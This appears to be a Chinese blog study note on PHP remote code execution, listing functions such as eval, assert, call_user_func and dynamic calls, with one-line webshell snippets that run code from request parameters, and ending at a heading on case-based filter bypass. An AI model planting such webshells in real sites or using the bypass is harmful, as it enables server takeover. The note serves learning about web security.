---
title: 简单代码执行的学习
date: 2022-09-10 16:48:24
tags:
- rce
categories: 
- web
- 笔记
---

## 常见函数

> https://blog.csdn.net/qq_32108547/article/details/95649397

### eval()

eval() 函数把字符串按照 PHP 代码来计算，如常见的一句话后门程序：

`<?php eval($_POST[cmd])?>`

### assert()

与eval类

```php
<?php
    //?cmd=phpinfo() 
    assert($_REQUEST[cmd]); 
?>
```

### call_user_func()/call_user_func_array ()

call_user_func — 把第一个参数作为回调函数调用,其余参数是回调函数的参数。

call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数

```php
<?php 
    //?cmd=phpinfo()
    @call_user_func(assert,$_GET['cmd']);
?>

<?php 
    //?cmd=phpinfo()
    $cmd=$_GET['cmd'];
    $array[0]=$cmd;
    call_user_func_array("assert",$array);
?>
```

### 动态函数

```php
<?php 
//?a=assert&b=phpinfo()
$_GET['a']($_GET['b']);
?>
```

### array_walk()和array_walk_recursive()

array_walk — 使用用户自定义函数对数组中的每个元素做回调处理

```php
function myfunction($value,$key) {
    echo "键 $key 的值是 $value 。<br>";
}

$a1=array("a"=>"red","b"=>"green");
array_walk($a1,"myfunction");
```

```
键 a 的值是 red 。
键 b 的值是 green 。
```

array_walk_recursive — 对数组中的每个成员**递归**地应用用户函数

```php
function myfunction($value,$key) {
    echo "键 $key 的值是 $value 。<br>";
}

$a1=array("a"=>"red","b"=>"green");
$a2=array($a1,"1"=>"blue","2"=>"yellow");
array_walk_recursive($a2,"myfunction");
```

```php
键 a 的值是 red 。
键 b 的值是 green 。
键 1 的值是 blue 。
键 2 的值是 yellow 。
```

## 常见过滤

### 关键函数过滤

大小写绕过
